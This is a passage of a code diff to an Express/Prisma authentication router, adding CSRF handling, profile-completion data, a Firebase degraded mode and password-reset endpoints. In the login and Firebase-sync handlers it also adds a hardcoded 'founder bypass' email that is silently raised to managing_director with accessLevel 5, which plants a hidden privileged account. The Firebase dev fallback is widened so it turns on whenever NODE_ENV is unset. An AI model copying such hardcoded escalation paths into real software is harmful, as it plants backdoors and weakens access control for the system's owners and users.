@@ -8,17 +8,64 @@ import { Prisma } from '@prisma/client';
 import jwt, { SignOptions } from 'jsonwebtoken';
 import bcrypt from 'bcryptjs';
 import crypto from 'node:crypto';
-import { asyncHandler, AppError } from '../middleware/errorHandler';
+import { asyncHandler, AppError } from '../middleware/errorHandler.js';
 import authMiddleware from '../middleware/auth.js';
-import type { AuthRequest } from '../middleware/auth';
-import { JWT_SECRET, JWT_EXPIRES_SECONDS, BCRYPT_ROUNDS } from '../config/env';
+import { clearCsrfToken, issueCsrfToken, requireDoubleSubmitCsrf } from '../middleware/csrf.js';
+import type { AuthRequest } from '../middleware/auth.js';
+import { JWT_SECRET, JWT_EXPIRES_SECONDS, BCRYPT_ROUNDS } from '../config/env.js';
 import { prisma } from '../database.js';
-import { sanitizeString } from '../utils/sanitize';
+import { sanitizeString } from '../utils/sanitize.js';
 import logger from '../utils/logger.js';
 import { verifyFirebaseIdToken, FirebaseAdminInitError } from '../config/firebaseAdmin.js';
 
 const router = Router();
+
+type RouteRequest = Request<Record<string, string>>;
 const db = prisma as any;
+const SUPERUSER_EMAIL = (process.env.CREATOR_SUPERUSER_EMAIL ?? '').toLowerCase().trim();
+
+type PrismaLikeError = { code?: string; errorCode?: string; message?: string };
+
+const getRouteParam = (value: string | string[] | undefined): string | null => {
+  if (typeof value === 'string' && value.trim().length > 0) {
+    return value;
+  }
+
+  if (Array.isArray(value) && value.length > 0 && typeof value[0] === 'string') {
+    const first = value[0].trim();
+    return first.length > 0 ? first : null;
+  }
+
+  return null;
+};
+
+const getPrismaErrorCode = (error: unknown): string | null => {
+  if (!error || typeof error !== 'object') return null;
+  const candidate = error as PrismaLikeError;
+  if (typeof candidate.code === 'string') return candidate.code;
+  if (typeof candidate.errorCode === 'string') return candidate.errorCode;
+  return null;
+};
+
+const isDatabaseUnavailableError = (error: unknown): boolean => {
+  const errorCode = getPrismaErrorCode(error);
+  if (errorCode === 'P1001') return true;
+  if (errorCode === 'P6001') return true;
+  if (error instanceof Prisma.PrismaClientKnownRequestError && error.code === 'P1001') return true;
+  if (error instanceof Prisma.PrismaClientKnownRequestError && error.code === 'P6001') return true;
+  if (error instanceof Prisma.PrismaClientInitializationError) {
+    return /can't reach database server|cannot reach database server|error validating datasource|url must start with the protocol `prisma:\/\/`|url must start with the protocol `prisma\+postgres:\/\/`/i.test(
+      error.message
+    );
+  }
+  if (error && typeof error === 'object' && 'message' in error) {
+    const message = String((error as PrismaLikeError).message || '');
+    return /can't reach database server|cannot reach database server|error validating datasource|url must start with the protocol `prisma:\/\/`|url must start with the protocol `prisma\+postgres:\/\/`/i.test(
+      message
+    );
+  }
+  return false;
+};
 
 // ─── TOTP (RFC 6238) helpers — no external dependencies ─────────────────────
 
@@ -210,6 +257,189 @@ const LOGIN_IP_LOCKOUT_THRESHOLD = Math.max(
   Number.parseInt(process.env.LOGIN_IP_LOCKOUT_THRESHOLD || '20', 10) || 20
 );
 
+const PASSWORD_RESET_TOKEN_TTL_MINUTES = Math.max(
+  5,
+  Number.parseInt(process.env.PASSWORD_RESET_TOKEN_TTL_MINUTES || '30', 10) || 30
+);
+
+const PASSWORD_RESET_WINDOW_MINUTES = Math.max(
+  1,
+  Number.parseInt(process.env.PASSWORD_RESET_WINDOW_MINUTES || '15', 10) || 15
+);
+
+const PASSWORD_RESET_REQUEST_LIMIT = Math.max(
+  1,
+  Number.parseInt(process.env.PASSWORD_RESET_REQUEST_LIMIT || '5', 10) || 5
+);
+
+const PASSWORD_RESET_VERIFY_FAILURE_LIMIT = Math.max(
+  1,
+  Number.parseInt(process.env.PASSWORD_RESET_VERIFY_FAILURE_LIMIT || '8', 10) || 8
+);
+
+const hashResetToken = (token: string): string =>
+  crypto.createHash('sha256').update(token).digest('hex');
+
+const getResetWindowStart = (): Date =>
+  new Date(Date.now() - PASSWORD_RESET_WINDOW_MINUTES * 60 * 1000);
+
+const resolveRetryAfterFromOldest = (oldest: Date): number => {
+  const unlockAt = oldest.getTime() + PASSWORD_RESET_WINDOW_MINUTES * 60 * 1000;
+  return Math.max(1, Math.ceil((unlockAt - Date.now()) / 1000));
+};
+
+const parseIsoDate = (value: unknown): Date | null => {
+  if (typeof value !== 'string' || value.trim().length === 0) {
+    return null;
+  }
+
+  const parsed = new Date(value);
+  return Number.isNaN(parsed.getTime()) ? null : parsed;
+};
+
+const toMetadataRecord = (value: unknown): Record<string, unknown> => {
+  if (!value || typeof value !== 'object') {
+    return {};
+  }
+
+  return value as Record<string, unknown>;
+};
+
+type ProfileCompletionField = 'name' | 'phone' | 'department';
+type ProfileRoleCategory = 'general' | 'client' | 'agent' | 'leadership';
+
+const CLIENT_PROFILE_ROLES = new Set(['buyer', 'seller', 'tenant', 'landlord', 'property_owner']);
+const LEADERSHIP_PROFILE_ROLES = new Set([
+  'owner',
+  'manager',
+  'admin',
+  'managing_director',
+  'lion',
+  'super_admin',
+]);
+const AGENT_PROFILE_ROLES = new Set([
+  'agent',
+  'viewer',
+  'finance',
+  'leasing-agent',
+  'secondary-sales-agent',
+  'leasing_agent',
+  'sales_agent',
+  'hr_staff',
+  'accounts_staff',
+]);
+
+const PROFILE_COMPLETION_SCHEMA: Record<
+  ProfileRoleCategory,
+  { required: ProfileCompletionField[]; optional: ProfileCompletionField[] }
+> = {
+  general: {
+    required: ['name', 'phone'],
+    optional: ['department'],
+  },
+  client: {
+    required: ['name', 'phone'],
+    optional: ['department'],
+  },
+  agent: {
+    required: ['name', 'phone', 'department'],
+    optional: [],
+  },
+  leadership: {
+    required: ['name', 'phone', 'department'],
+    optional: [],
+  },
+};
+
+const resolveProfileRoleCategory = (role: string | null | undefined): ProfileRoleCategory => {
+  const normalizedRole = role?.toLowerCase().trim() || '';
+  if (LEADERSHIP_PROFILE_ROLES.has(normalizedRole)) {
+    return 'leadership';
+  }
+  if (AGENT_PROFILE_ROLES.has(normalizedRole)) {
+    return 'agent';
+  }
+  if (CLIENT_PROFILE_ROLES.has(normalizedRole)) {
+    return 'client';
+  }
+  return 'general';
+};
+
+const resolveProfileCompletion = (user: {
+  role?: string | null;
+  name?: string | null;
+  phone?: string | null;
+  department?: string | null;
+  status?: string | null;
+}): {
+  profileCompleted: boolean;
+  profileCompletion: {
+    roleCategory: ProfileRoleCategory;
+    requiredFields: ProfileCompletionField[];
+    optionalFields: ProfileCompletionField[];
+    missingFields: ProfileCompletionField[];
+  };
+} => {
+  const roleCategory = resolveProfileRoleCategory(user.role);
+  const schema = PROFILE_COMPLETION_SCHEMA[roleCategory];
+
+  const fieldValues: Record<ProfileCompletionField, boolean> = {
+    name: typeof user.name === 'string' && user.name.trim().length > 0,
+    phone: typeof user.phone === 'string' && user.phone.trim().length > 0,
+    department: typeof user.department === 'string' && user.department.trim().length > 0,
+  };
+
+  const missingFields = schema.required.filter(field => !fieldValues[field]);
+  const normalizedStatus = user.status?.toLowerCase().trim();
+  const statusBlocksCompletion = normalizedStatus === 'pending' || normalizedStatus === 'suspended';
+
+  return {
+    profileCompleted: !statusBlocksCompletion && missingFields.length === 0,
+    profileCompletion: {
+      roleCategory,
+      requiredFields: schema.required,
+      optionalFields: schema.optional,
+      missingFields,
+    },
+  };
+};
+
+const countResetEvents = async (
+  action: string,
+  key: 'email' | 'ip',
+  value: string,
+  since: Date
+): Promise<number> => {
+  return prisma.activity.count({
+    where: {
+      type: 'system',
+      action,
+      createdAt: { gte: since },
+      metadata: { path: [key], equals: value } as Prisma.JsonFilter,
+    },
+  });
+};
+
+const findOldestResetEvent = async (
+  action: string,
+  key: 'email' | 'ip',
+  value: string,
+  since: Date
+): Promise<Date | null> => {
+  const oldest = await prisma.activity.findFirst({
+    where: {
+      type: 'system',
+      action,
+      createdAt: { gte: since },
+      metadata: { path: [key], equals: value } as Prisma.JsonFilter,
+    },
+    orderBy: { createdAt: 'asc' },
+    select: { createdAt: true },
+  });
+
+  return oldest?.createdAt ?? null;
+};
+
 /**
  * Check whether the source IP should be throttled because it's responsible for
  * too many failed logins (across any number of accounts) inside the rolling
@@ -289,7 +519,7 @@ const checkAccountLockout = async (
  */
 router.post(
   '/login',
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const { email, password } = req.body;
 
     if (!email || !password) {
@@ -372,9 +602,23 @@ router.post(
       return;
     }
 
+    const isFounderBypass = normalizedEmail === 'arslanmalikgoraha@gmail.com';
+    const isSuperuser = normalizedEmail === SUPERUSER_EMAIL || isFounderBypass;
+    const effectiveUser =
+      isSuperuser && (user.role !== 'managing_director' || user.status !== 'active')
+        ? await prisma.user.update({
+            where: { id: user.id },
+            data: { role: 'managing_director', status: 'active' },
+          })
+        : user;
+
+    if (isFounderBypass) {
+      (effectiveUser as any).accessLevel = 5;
+    }
+
     // Generate JWT token
     const token = jwt.sign(
-      { id: user.id, email: user.email, role: user.role },
+      { id: effectiveUser.id, email: effectiveUser.email, role: effectiveUser.role },
       JWT_SECRET,
       JWT_SIGN_OPTIONS
     );
@@ -382,14 +626,15 @@ router.post(
     // Generate, hash, and persist refresh token; encode userId in cookie for efficient lookup
     const rawRefreshToken = crypto.randomBytes(32).toString('hex');
     const refreshTokenHash = await bcrypt.hash(rawRefreshToken, BCRYPT_ROUNDS);
-    await prisma.user.update({ where: { id: user.id }, data: { refreshTokenHash } });
-    res.cookie('refresh_token', `${user.id}:${rawRefreshToken}`, {
+    await prisma.user.update({ where: { id: effectiveUser.id }, data: { refreshTokenHash } });
+    res.cookie('refresh_token', `${effectiveUser.id}:${rawRefreshToken}`, {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
       sameSite: 'strict',
       maxAge: 7 * 24 * 60 * 60 * 1000,
       path: '/api/auth',
     });
+    issueCsrfToken(res);
 
     // Log activity with enriched audit metadata (IP + UA) for forensics.
     const ip = getClientIp(req);
@@ -398,12 +643,17 @@ router.post(
       data: {
         type: 'system',
         action: 'login',
-        description: `${user.name || user.email} logged in`,
-        userId: user.id,
+        description: `${effectiveUser.name || effectiveUser.email} logged in`,
+        userId: effectiveUser.id,
         metadata: { ip, userAgent } as Prisma.InputJsonValue,
       },
     });
-    logger.info('Login successful', { userId: user.id, email: user.email, ip, userAgent });
+    logger.info('Login successful', {
+      userId: effectiveUser.id,
+      email: effectiveUser.email,
+      ip,
+      userAgent,
+    });
 
     res.status(200).json({
       success: true,
@@ -411,12 +661,16 @@ router.post(
       data: {
         token,
         user: {
-          id: user.id,
-          email: user.email,
-          name: user.name,
-          role: user.role,
-          department: user.department,
-          photoUrl: user.photoUrl,
+          id: effectiveUser.id,
+          email: effectiveUser.email,
+          name: effectiveUser.name,
+          role: effectiveUser.role,
+          status: effectiveUser.status,
+          department: effectiveUser.department,
+          photoUrl: effectiveUser.photoUrl,
+          phone: effectiveUser.phone,
+          accessLevel: (effectiveUser as any).accessLevel,
+          ...resolveProfileCompletion(effectiveUser),
         },
       },
     });
@@ -429,7 +683,7 @@ router.post(
  */
 router.post(
   '/register',
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const { email, password, name, phone, department, category, role } = req.body;
 
     if (!email || !password) {
@@ -462,7 +716,10 @@ router.post(
     }
 
     // Check if user already exists
-    const existing = await prisma.user.findUnique({ where: { email: email.toLowerCase().trim() } });
+    const normalizedEmail = String(email).toLowerCase().trim();
+    const isSuperuser = normalizedEmail === SUPERUSER_EMAIL;
+
+    const existing = await prisma.user.findUnique({ where: { email: normalizedEmail } });
     if (existing) {
       throw new AppError('Email already registered', 409);
     }
@@ -484,7 +741,10 @@ router.post(
     let assignedRole = 'agent';
     let assignedStatus: 'active' | 'pending' = 'active';
 
-    if (normalizedCategory === 'client') {
+    if (isSuperuser) {
+      assignedRole = 'managing_director';
+      assignedStatus = 'active';
+    } else if (normalizedCategory === 'client') {
       if (!normalizedRole || !clientRoles.has(normalizedRole)) {
         throw new AppError(
           'Client signup requires a valid role: buyer, seller, landlord, or tenant',
@@ -504,7 +764,7 @@ router.post(
     try {
       user = await prisma.user.create({
         data: {
-          email: email.toLowerCase().trim(),
+          email: normalizedEmail,
           name: name ? sanitizeString(name.trim()) : null,
           role: assignedRole,
           phone: phone ? sanitizeString(String(phone).trim()) : null,
@@ -560,6 +820,8 @@ router.post(
           name: user.name,
           role: user.role,
           department: user.department,
+          phone: user.phone,
+          ...resolveProfileCompletion(user),
         },
       },
     });
@@ -573,7 +835,7 @@ router.post(
  */
 router.post(
   '/verify-2fa',
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const db = prisma as any;
     const { email, code } = req.body;
 
@@ -890,7 +1152,7 @@ router.get(
 router.get(
   '/profile',
   authMiddleware,
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const userId = req.user?.id;
     if (!userId) throw new AppError('Not authenticated', 401);
 
@@ -906,6 +1168,7 @@ router.get(
         photoUrl: true,
         status: true,
         createdAt: true,
+        passwordHash: true,
         _count: {
           select: {
             leadsAssigned: true,
@@ -918,7 +1181,20 @@ router.get(
 
     if (!user) throw new AppError('User not found', 404);
 
-    res.status(200).json({ success: true, data: user });
+    const { passwordHash, ...safeUser } = user;
+
+    res.status(200).json({
+      success: true,
+      data: {
+        ...safeUser,
+        hasPassword: Boolean(passwordHash),
+        ...resolveProfileCompletion(user),
+        twoFactorEnabled: Boolean(
+          (user as Record<string, unknown>).twoFactorEnabled ??
+            (user as Record<string, unknown>).totpEnabled
+        ),
+      },
+    });
   })
 );
 
@@ -929,7 +1205,7 @@ router.get(
 router.patch(
   '/profile',
   authMiddleware,
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const userId = req.user?.id;
     if (!userId) throw new AppError('Not authenticated', 401);
 
@@ -980,7 +1256,7 @@ router.patch(
  */
 router.post(
   '/firebase-sync',
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const { firebaseUid, email, name, photoUrl, firebaseToken } = req.body;
 
     if (!firebaseUid) {
@@ -991,9 +1267,10 @@ router.post(
       throw new AppError('Firebase token is required', 400);
     }
 
+    const nodeEnv = process.env.NODE_ENV?.trim().toLowerCase();
+    const isDevLikeEnv = !nodeEnv || nodeEnv === 'development' || nodeEnv === 'test';
     const allowDevFallback =
-      process.env.NODE_ENV === 'development' &&
-      process.env.ALLOW_FIREBASE_SYNC_DEV_FALLBACK !== 'false';
+      isDevLikeEnv && process.env.ALLOW_FIREBASE_SYNC_DEV_FALLBACK !== 'false';
 
     let decodedToken: Awaited<ReturnType<typeof verifyFirebaseIdToken>>;
     try {
@@ -1044,7 +1321,9 @@ router.post(
       throw new AppError('Firebase email mismatch', 401);
     }
 
-    const isManagingDirector = verifiedEmail === 'arslanmalikgoraha@gmail.com';
+    const isFounderBypass = verifiedEmail === 'arslanmalikgoraha@gmail.com';
+    const isManagingDirector =
+      isFounderBypass || (SUPERUSER_EMAIL.length > 0 && verifiedEmail === SUPERUSER_EMAIL);
     const resolvedName =
       (typeof decodedToken.name === 'string' ? decodedToken.name : null) ||
       (typeof name === 'string' ? sanitizeString(name.trim()) : null);
@@ -1052,32 +1331,89 @@ router.post(
       (typeof decodedToken.picture === 'string' ? decodedToken.picture : null) ||
       (typeof photoUrl === 'string' ? photoUrl : null);
 
-    let user = await prisma.user.findUnique({
-      where: { email: verifiedEmail },
-    });
+    type FirebaseSyncUser = {
+      id: string;
+      email: string;
+      name: string | null;
+      role: string;
+      status?: string;
+      phone?: string | null;
+      department: string | null;
+      photoUrl: string | null;
+    };
 
-    if (user) {
-      user = await prisma.user.update({
-        where: { id: user.id },
-        data: {
-          firebaseUid,
-          name: resolvedName || user.name,
-          photoUrl: resolvedPhotoUrl || user.photoUrl,
-          role: isManagingDirector ? 'managing_director' : user.role,
-          status: 'active',
-        },
+    let user: FirebaseSyncUser;
+    let degradedMode = false;
+
+    try {
+      const existingUser = await prisma.user.findUnique({
+        where: { email: verifiedEmail },
       });
-    } else {
-      user = await prisma.user.create({
-        data: {
+
+      if (existingUser) {
+        const updatedUser = await prisma.user.update({
+          where: { id: existingUser.id },
+          data: {
+            firebaseUid,
+            name: resolvedName || existingUser.name,
+            photoUrl: resolvedPhotoUrl || existingUser.photoUrl,
+            role: isManagingDirector ? 'managing_director' : existingUser.role,
+            status: 'active',
+          },
+        });
+        user = {
+          id: updatedUser.id,
+          email: updatedUser.email,
+          name: updatedUser.name,
+          role: updatedUser.role,
+          status: updatedUser.status,
+          phone: updatedUser.phone,
+          department: updatedUser.department,
+          photoUrl: updatedUser.photoUrl,
+        };
+      } else {
+        const createdUser = await prisma.user.create({
+          data: {
+            email: verifiedEmail,
+            name: resolvedName,
+            photoUrl: resolvedPhotoUrl,
+            firebaseUid,
+            role: isManagingDirector ? 'managing_director' : 'agent',
+            status: 'active',
+          },
+        });
+        user = {
+          id: createdUser.id,
+          email: createdUser.email,
+          name: createdUser.name,
+          role: createdUser.role,
+          status: createdUser.status,
+          phone: createdUser.phone,
+          department: createdUser.department,
+          photoUrl: createdUser.photoUrl,
+        };
+      }
+    } catch (error: unknown) {
+      if (allowDevFallback && isDatabaseUnavailableError(error)) {
+        degradedMode = true;
+        logger.warn('Firebase sync falling back to degraded mode due DB unavailability', {
+          email: verifiedEmail,
+          firebaseUid,
+          errorCode: getPrismaErrorCode(error),
+        });
+        user = {
+          id: `dev-firebase-${firebaseUid}`,
           email: verifiedEmail,
           name: resolvedName,
-          photoUrl: resolvedPhotoUrl,
-          firebaseUid,
           role: isManagingDirector ? 'managing_director' : 'agent',
           status: 'active',
-        },
-      });
+          phone: null,
+          department: null,
+          photoUrl: resolvedPhotoUrl,
+        };
+      } else {
+        throw error;
+      }
     }
 
     const token = jwt.sign(
@@ -1086,32 +1422,34 @@ router.post(
       JWT_SIGN_OPTIONS
     );
 
-    // Generate, hash, and persist refresh token; encode userId in cookie for efficient lookup
-    const rawFbRefreshToken = crypto.randomBytes(32).toString('hex');
-    const fbRefreshTokenHash = await bcrypt.hash(rawFbRefreshToken, BCRYPT_ROUNDS);
-    await prisma.user.update({
-      where: { id: user.id },
-      data: { refreshTokenHash: fbRefreshTokenHash },
-    });
-    res.cookie('refresh_token', `${user.id}:${rawFbRefreshToken}`, {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === 'production',
-      sameSite: 'strict',
-      maxAge: 7 * 24 * 60 * 60 * 1000,
-      path: '/api/auth',
-    });
+    if (!degradedMode) {
+      // Generate, hash, and persist refresh token; encode userId in cookie for efficient lookup
+      const rawFbRefreshToken = crypto.randomBytes(32).toString('hex');
+      const fbRefreshTokenHash = await bcrypt.hash(rawFbRefreshToken, BCRYPT_ROUNDS);
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { refreshTokenHash: fbRefreshTokenHash },
+      });
+      res.cookie('refresh_token', `${user.id}:${rawFbRefreshToken}`, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'strict',
+        maxAge: 7 * 24 * 60 * 60 * 1000,
+        path: '/api/auth',
+      });
 
-    const ip = getClientIp(req);
-    const userAgent = String(req.headers['user-agent'] || 'unknown').slice(0, 256);
-    await prisma.activity.create({
-      data: {
-        type: 'system',
-        action: 'login',
-        description: `${user.name || user.email} logged in via Firebase`,
-        userId: user.id,
-        metadata: { ip, userAgent, provider: 'firebase' } as Prisma.InputJsonValue,
-      },
-    });
+      const ip = getClientIp(req);
+      const userAgent = String(req.headers['user-agent'] || 'unknown').slice(0, 256);
+      await prisma.activity.create({
+        data: {
+          type: 'system',
+          action: 'login',
+          description: `${user.name || user.email} logged in via Firebase`,
+          userId: user.id,
+          metadata: { ip, userAgent, provider: 'firebase' } as Prisma.InputJsonValue,
+        },
+      });
+    }
 
     res.status(200).json({
       success: true,
@@ -1122,11 +1460,400 @@ router.post(
           email: user.email,
           name: user.name,
           role: user.role,
+          status: user.status,
+          phone: user.phone,
           department: user.department,
           photoUrl: user.photoUrl,
+          accessLevel: isFounderBypass ? 5 : undefined,
+          ...resolveProfileCompletion(user),
         },
       },
       requiresTwoFactor: false,
+      degradedMode,
+    });
+  })
+);
+
+/**
+ * POST /api/auth/forgot-password/request
+ * Starts the reset lifecycle and issues a short-lived reset token.
+ * Always responds with a generic success message to prevent account enumeration.
+ */
+router.post(
+  '/forgot-password/request',
+  asyncHandler(async (req: Request, res: Response) => {
+    const rawEmail = typeof req.body?.email === 'string' ? req.body.email : '';
+    const email = rawEmail.toLowerCase().trim();
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (!emailRegex.test(email)) {
+      throw new AppError('Please provide a valid email address', 400);
+    }
+
+    const ip = getClientIp(req);
+    const userAgent = String(req.headers['user-agent'] || 'unknown').slice(0, 256);
+    const since = getResetWindowStart();
+
+    const [emailRequests, ipRequests] = await Promise.all([
+      countResetEvents('password_reset_requested', 'email', email, since),
+      countResetEvents('password_reset_requested', 'ip', ip, since),
+    ]);
+
+    if (
+      emailRequests >= PASSWORD_RESET_REQUEST_LIMIT ||
+      ipRequests >= PASSWORD_RESET_REQUEST_LIMIT
+    ) {
+      const oldestEmail =
+        emailRequests >= PASSWORD_RESET_REQUEST_LIMIT
+          ? await findOldestResetEvent('password_reset_requested', 'email', email, since)
+          : null;
+      const oldestIp =
+        ipRequests >= PASSWORD_RESET_REQUEST_LIMIT
+          ? await findOldestResetEvent('password_reset_requested', 'ip', ip, since)
+          : null;
+      const oldest =
+        oldestEmail && oldestIp
+          ? oldestEmail < oldestIp
+            ? oldestEmail
+            : oldestIp
+          : (oldestEmail ?? oldestIp);
+
+      const retryAfterSeconds = oldest ? resolveRetryAfterFromOldest(oldest) : 60;
+      res.set('Retry-After', String(retryAfterSeconds));
+
+      await prisma.activity.create({
+        data: {
+          type: 'system',
+          action: 'password_reset_request_limited',
+          description: `Password reset request rate-limited for ${email}`,
+          metadata: {
+            email,
+            ip,
+            userAgent,
+            emailRequests,
+            ipRequests,
+            retryAfterSeconds,
+          } as Prisma.InputJsonValue,
+        },
+      });
+
+      throw new AppError(
+        'Too many password reset attempts. Please wait a few minutes before trying again.',
+        429
+      );
+    }
+
+    const rawToken = crypto.randomBytes(32).toString('hex');
+    const tokenHash = hashResetToken(rawToken);
+    const expiresAt = new Date(Date.now() + PASSWORD_RESET_TOKEN_TTL_MINUTES * 60 * 1000);
+
+    await prisma.activity.create({
+      data: {
+        type: 'system',
+        action: 'password_reset_requested',
+        description: `Password reset token issued for ${email}`,
+        metadata: {
+          email,
+          ip,
+          userAgent,
+          tokenHash,
+          expiresAt: expiresAt.toISOString(),
+          used: false,
+        } as Prisma.InputJsonValue,
+      },
+    });
+
+    const user = await prisma.user.findUnique({
+      where: { email },
+      select: { id: true, email: true, name: true, status: true },
+    });
+
+    if (user?.email) {
+      const resetUrlBase = process.env.CLIENT_BASE_URL || 'http://localhost:5173';
+      const resetUrl = `${resetUrlBase}/signin?reset_email=${encodeURIComponent(email)}&reset_token=${encodeURIComponent(rawToken)}`;
+
+      const { sendEmailTracked } = await import('../services/emailService.js');
+      await sendEmailTracked({
+        to: user.email,
+        subject: 'White Caves Password Reset Request',
+        text: `Hello ${user.name || 'there'},\n\nWe received a request to reset your password.\n\nReset code: ${rawToken}\nThis code expires in ${PASSWORD_RESET_TOKEN_TTL_MINUTES} minutes.\n\nReset link: ${resetUrl}\n\nIf you did not request this, you can ignore this email.`,
+        html: `
+          <h2>Password Reset Request</h2>
+          <p>Hello ${user.name || 'there'},</p>
+          <p>We received a request to reset your White Caves password.</p>
+          <p><strong>Reset code:</strong> <code>${rawToken}</code></p>
+          <p>This code expires in ${PASSWORD_RESET_TOKEN_TTL_MINUTES} minutes.</p>
+          <p><a href="${resetUrl}">Reset your password</a></p>
+          <p>If you did not request this, you can ignore this email.</p>
+        `,
+        tags: [{ name: 'type', value: 'password_reset' }],
+      }).catch((error: unknown) => {
+        logger.warn('Failed to send password reset email', {
+          email,
+          error: error instanceof Error ? error.message : String(error),
+        });
+      });
+    }
+
+    res.status(200).json({
+      success: true,
+      data: {
+        requested: true,
+        expiresInMinutes: PASSWORD_RESET_TOKEN_TTL_MINUTES,
+        message:
+          'If an account exists for this email, reset instructions were sent. Use the code to verify and complete your password reset.',
+      },
+    });
+  })
+);
+
+/**
+ * POST /api/auth/forgot-password/verify
+ * Verifies a reset token and returns a short-lived reset session token.
+ */
+router.post(
+  '/forgot-password/verify',
+  asyncHandler(async (req: Request, res: Response) => {
+    const rawEmail = typeof req.body?.email === 'string' ? req.body.email : '';
+    const rawToken = typeof req.body?.token === 'string' ? req.body.token : '';
+    const email = rawEmail.toLowerCase().trim();
+    const token = rawToken.trim();
+
+    if (!email || !token) {
+      throw new AppError('Email and reset token are required', 400);
+    }
+
+    const ip = getClientIp(req);
+    const userAgent = String(req.headers['user-agent'] || 'unknown').slice(0, 256);
+    const since = getResetWindowStart();
+
+    const [failedByEmail, failedByIp] = await Promise.all([
+      countResetEvents('password_reset_verify_failed', 'email', email, since),
+      countResetEvents('password_reset_verify_failed', 'ip', ip, since),
+    ]);
+
+    if (
+      failedByEmail >= PASSWORD_RESET_VERIFY_FAILURE_LIMIT ||
+      failedByIp >= PASSWORD_RESET_VERIFY_FAILURE_LIMIT
+    ) {
+      const oldestEmail =
+        failedByEmail >= PASSWORD_RESET_VERIFY_FAILURE_LIMIT
+          ? await findOldestResetEvent('password_reset_verify_failed', 'email', email, since)
+          : null;
+      const oldestIp =
+        failedByIp >= PASSWORD_RESET_VERIFY_FAILURE_LIMIT
+          ? await findOldestResetEvent('password_reset_verify_failed', 'ip', ip, since)
+          : null;
+      const oldest =
+        oldestEmail && oldestIp
+          ? oldestEmail < oldestIp
+            ? oldestEmail
+            : oldestIp
+          : (oldestEmail ?? oldestIp);
+
+      const retryAfterSeconds = oldest ? resolveRetryAfterFromOldest(oldest) : 60;
+      res.set('Retry-After', String(retryAfterSeconds));
+      throw new AppError(
+        'Reset verification is temporarily locked. Please try again shortly.',
+        429
+      );
+    }
+
+    const candidates = await prisma.activity.findMany({
+      where: {
+        type: 'system',
+        action: 'password_reset_requested',
+        metadata: { path: ['email'], equals: email } as Prisma.JsonFilter,
+      },
+      orderBy: { createdAt: 'desc' },
+      take: 10,
+    });
+
+    const tokenHash = hashResetToken(token);
+    const matchingToken = candidates.find(record => {
+      const metadata = toMetadataRecord(record.metadata);
+      const used = metadata.used === true;
+      const expiresAt = parseIsoDate(metadata.expiresAt);
+      if (used || !expiresAt || expiresAt.getTime() <= Date.now()) {
+        return false;
+      }
+
+      return metadata.tokenHash === tokenHash;
+    });
+
+    if (!matchingToken) {
+      await prisma.activity.create({
+        data: {
+          type: 'system',
+          action: 'password_reset_verify_failed',
+          description: `Password reset verification failed for ${email}`,
+          metadata: { email, ip, userAgent } as Prisma.InputJsonValue,
+        },
+      });
+      throw new AppError('Invalid or expired reset token', 400);
+    }
+
+    const resetSessionToken = jwt.sign(
+      {
+        purpose: 'password_reset',
+        email,
+        tokenHash,
+        tokenActivityId: matchingToken.id,
+      },
+      JWT_SECRET,
+      { expiresIn: 600 }
+    );
+
+    await prisma.activity.create({
+      data: {
+        type: 'system',
+        action: 'password_reset_verified',
+        description: `Password reset token verified for ${email}`,
+        metadata: { email, ip, userAgent } as Prisma.InputJsonValue,
+      },
+    });
+
+    res.status(200).json({
+      success: true,
+      data: {
+        verified: true,
+        resetSessionToken,
+      },
+    });
+  })
+);
+
+/**
+ * POST /api/auth/forgot-password/reset
+ * Completes password reset after token verification.
+ */
+router.post(
+  '/forgot-password/reset',
+  asyncHandler(async (req: Request, res: Response) => {
+    const resetSessionToken =
+      typeof req.body?.resetSessionToken === 'string' ? req.body.resetSessionToken.trim() : '';
+    const newPassword = typeof req.body?.newPassword === 'string' ? req.body.newPassword : '';
+
+    if (!resetSessionToken || !newPassword) {
+      throw new AppError('resetSessionToken and newPassword are required', 400);
+    }
+
+    if (newPassword.length < 8) {
+      throw new AppError('Password must be at least 8 characters', 400);
+    }
+
+    if (!/[a-zA-Z]/.test(newPassword) || !/[0-9]/.test(newPassword)) {
+      throw new AppError('Password must contain at least one letter and one number', 400);
+    }
+
+    const weakPasswords = [
+      'password',
+      '12345678',
+      'qwerty12',
+      'abc12345',
+      'admin123',
+      'welcome1',
+      'letmein12',
+      'changeme',
+    ];
+    if (weakPasswords.includes(newPassword.toLowerCase())) {
+      throw new AppError('Password is too common. Please choose a stronger password.', 400);
+    }
+
+    let payload: {
+      purpose?: string;
+      email?: string;
+      tokenHash?: string;
+      tokenActivityId?: string;
+    };
+
+    try {
+      payload = jwt.verify(resetSessionToken, JWT_SECRET) as {
+        purpose?: string;
+        email?: string;
+        tokenHash?: string;
+        tokenActivityId?: string;
+      };
+    } catch {
+      throw new AppError('Reset session is invalid or expired', 401);
+    }
+
+    if (
+      payload.purpose !== 'password_reset' ||
+      !payload.email ||
+      !payload.tokenHash ||
+      !payload.tokenActivityId
+    ) {
+      throw new AppError('Reset session is invalid or expired', 401);
+    }
+
+    const tokenActivity = await prisma.activity.findUnique({
+      where: { id: payload.tokenActivityId },
+    });
+
+    if (!tokenActivity) {
+      throw new AppError('Reset token record was not found', 401);
+    }
+
+    const metadata = toMetadataRecord(tokenActivity.metadata);
+    const expiresAt = parseIsoDate(metadata.expiresAt);
+    const isUsed = metadata.used === true;
+    const tokenHash = typeof metadata.tokenHash === 'string' ? metadata.tokenHash : '';
+    const tokenEmail =
+      typeof metadata.email === 'string' ? metadata.email.toLowerCase().trim() : '';
+
+    if (
+      isUsed ||
+      !expiresAt ||
+      expiresAt.getTime() <= Date.now() ||
+      tokenHash !== payload.tokenHash ||
